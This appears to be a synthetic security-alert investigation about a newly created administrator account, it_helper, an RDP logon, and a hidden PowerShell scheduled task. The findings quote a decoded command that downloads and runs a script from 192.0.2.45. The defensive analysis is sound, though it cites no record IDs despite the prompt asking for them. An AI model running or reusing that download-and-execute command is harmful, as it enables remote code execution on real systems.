system: You are a security investigator reviewing an alert. Base every claim only on the evidence available to you. Cite the record IDs that support each observation.

supporting_observations.claim: The domain account it_helper was created at 13:41:49 UTC by HARBOR-DENTAL\omar.haddad.
About seven seconds later, it_helper was added to the Administrators group by HARBOR-DENTAL\omar.haddad.

At 13:38:25 UTC, omar.haddad established an RDP logon to WS-BCARTER-01 from 192.0.2.45. This conflicts with the supplied environment context that remote administration is only performed from WS-OHADDAD-01 and there is no VPN.

While omar.haddad's session was present on WS-BCARTER-01, a scheduled task was registered under his account to start PowerShell with -nop, -w hidden, and -enc. The encoded command decodes to IEX (iwr http://192.0.2.45/a.ps1), indicating an attempt to retrieve and execute a script from the same address used for the RDP connection.

The observed creation of a new account, immediate addition to Administrators, and script-launch task are inconsistent with the supplied help-desk practice of creating tmp.<name> accounts restricted to Temp-Staff and never granting them administrator rights.

known_telemetry_limitations: The task-registration record shows its configured command, but the available records do not show whether the task ran or whether the referenced script was retrieved or executed.
The available records do not establish the identity of the person operating the RDP session beyond the logged account name.
The logged address 192.0.2.45 is present in the RDP and task command records; the provided evidence does not independently establish its owner or whether it was reachable.
claims_not_established: Whether it_helper was subsequently used to log on or perform actions.
Whether the scheduled task executed successfully or changed the workstation or domain.
Whether the RDP activity and domain account changes were authorized by the organization despite conflicting with the supplied remote-administration practice.
additional_evidence_needed: Collect Task Scheduler operational and task history records, plus process-creation and PowerShell logs, to determine whether the task and encoded command executed.
Retrieve the referenced script, if available, and proxy, firewall, or network telemetry for connections to 192.0.2.45.
Review DC account-management and authentication records, including the provenance of the logon associated with the account changes and any subsequent logons or group changes involving it_helper.
Validate the RDP session and account changes with the organization’s authorized administrator and investigate the source and use of 192.0.2.45.
